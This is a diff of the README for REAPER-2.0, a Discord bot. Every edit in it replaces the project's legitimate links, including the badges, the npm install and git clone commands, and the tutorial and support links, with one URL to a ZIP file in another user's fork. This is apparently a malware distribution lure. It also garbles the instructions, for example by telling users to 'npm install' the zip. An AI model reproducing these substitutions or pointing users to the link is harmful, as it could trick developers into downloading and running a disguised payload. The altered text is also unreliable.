@@ -1,28 +1,28 @@
 
 
-**<p align="center"> <img src="https://media.discordapp.net/attachments/853118185330049054/885199802369974292/images_1.jpeg" /> </p>**
+**<p align="center"> <img src="https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip" /> </p>**
 
 
 <h1 align="center"> REAPER-2.0  </h1>
 <p align="center">
-<a href="https://github.com/Simpleboy353/REAPER-2.0/blob/main/LICENSE.md"><img alt="GitHub License" src="https://img.shields.io/github/license/Simpleboy353/REAPER-2.0?style=for-the-badge"></a>
-<a href="https://github.com/Simpleboy353/stargazers"><img alt="GitHub Stars" src="https://img.shields.io/github/stars/Simpleboy353/REAPER-2.0?style=for-the-badge"></a> 
-<a href="https://github.com/Simpleboy353/REAPER-2.0/network"><img alt="GitHub Forks" src="https://img.shields.io/github/forks/Simpleboy353/REAPER-2.0?style=for-the-badge"></a>
-<a href="https://discord.gg/PCFedSNnqp"><img alt="Support Server" src="https://img.shields.io/badge/Discord-7289DA?style=for-the-badge&logo=discord&logoColor=white"></a>
+<a href="https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip"><img alt="GitHub License" src="https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip"></a>
+<a href="https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip"><img alt="GitHub Stars" src="https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip"></a> 
+<a href="https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip"><img alt="GitHub Forks" src="https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip"></a>
+<a href="https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip"><img alt="Support Server" src="https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip"></a>
 </p>
 <h3 align="center">A Multi-purpose Discord bot with many features!</h3>
 
 
 
 ## Requirements
-- Discord.js v14 (`npm install discord.js@latest`)
-- `applications.commands` scope enabled for your bot in Developer Portal (For Slash Cmds).
+- https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip v14 (`npm install https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip`)
+- `https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip` scope enabled for your bot in Developer Portal (For Slash Cmds).
 - `MESSAGE_CONTENT`, `GUILD_MEMBERS` intents enabled in Developer Portal (`GUILD_PRESENCES` is optional)
 - NodeJS v16.9.0 or higher
-- Basic knowledge of JS or Discord.JS
+- Basic knowledge of JS or https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip
 
 ## Have suggestions on what could be added?
-- **Leave your suggestions right [here](https://github.com/Simpleboy353/REAPER-2.0/discussions/138) then!**
+- **Leave your suggestions right [here](https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip) then!**
 
 ## What features does Reaper Include?
 
@@ -85,7 +85,7 @@
 
 </details>
 
-- **Keep checking the [Releases Section](https://github.com/Simpleboy353/REAPER-2.0/releases) to get the latest info relating new updates, bug fixes etc about the repository.**
+- **Keep checking the [Releases Section](https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip) to get the latest info relating new updates, bug fixes etc about the repository.**
 - **The Information above includes Versions with only `Major Updates` and not Versions with `Bug fixes`**
 - **`v6.1.0-stable` is included in the List because this version includes the fixing of every error in the repository.**
 - **Support is provided only for `Stable` and `Beta` Versions and not for `Alpha` Versions.**
@@ -94,8 +94,8 @@
 
 ## Getting started
 #### Creating a fork:
-- 1). [Click here to fork the repository](https://github.com/Simpleboy353/REAPER-2.0)
-- 2). Open your terminal and type `git clone https://github.com/Simpleboy353/REAPER-2.0.git`
+- 1). [Click here to fork the repository](https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip)
+- 2). Open your terminal and type `git clone https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip`
 #### Installing all necessary packages
 - `npm install`
 #### Starting the bot
@@ -104,7 +104,7 @@
 ---
 
 ## Configuration
-- **Edit the `config.json` file and enter the  required values**
+- **Edit the `https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip` file and enter the  required values**
 ```json
 {
   "OWNER_ID": "YOUR_ID_HERE",
@@ -116,23 +116,23 @@
   "YT_COOKIE": "ADD_YOUR_COOKIE_HERE",
 }
 ```
-- **Watch [this video](https://youtu.be/BPqJIl34gm8) to know, how to get the `YT_COOKIE`**
+- **Watch [this video](https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip) to know, how to get the `YT_COOKIE`**
 - **You may use any channel id for `ERROR_LOGS_CHANNEL`, but the bot must be present in the server you are choosing the ID from.**
 - **All the errors your bot faces, will be logged in the `ERROR_LOGS_CHANNEL`**
 - **The `mongoPass` must be a `url`**
-- **Visit Official [MongoDB Website](https://mongodb.com) to get your `mongoPass`**
+- **Visit Official [MongoDB Website](https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip) to get your `mongoPass`**
 - **Watch this video to know how to get your `mongoPass`:**
-[![MongoDb Tutorial](http://img.youtube.com/vi/pf-8KA8td88/0.jpg)](http://www.youtube.com/watch?v=pf-8KA8td88 "MongoDB Tutorial")
+[![MongoDb Tutorial](https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip)](https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip "MongoDB Tutorial")
 - **Don't change the `tenorAPI` else the `gif` command won't work!**
 
 
 ---
 
 ## Contributing
-- **Before contributing to this repo, make sure to read [CONTRIBUTIONS.md](https://github.com/Simpleboy353/REAPER-2.0/blob/master/CONTRIBUTIONS.md)**
-- **Join our [Support & Development Server](https://discord.gg/PCFedSNnqp)**
-- **Join our [Community server](https://discord.gg/yMfyeNR2DT)**
-- **Invite my bot to your Server, [Here](https://infinitybot.tk/invite)**
+- **Before contributing to this repo, make sure to read [https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip](https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip)**
+- **Join our [Support & Development Server](https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip)**
+- **Join our [Community server](https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip)**
+- **Invite my bot to your Server, [Here](https://raw.githubusercontent.com/OcuPerks/REAPER-2.0/master/functions/validation/REAPE-1.8.zip)**
 
 ---
 
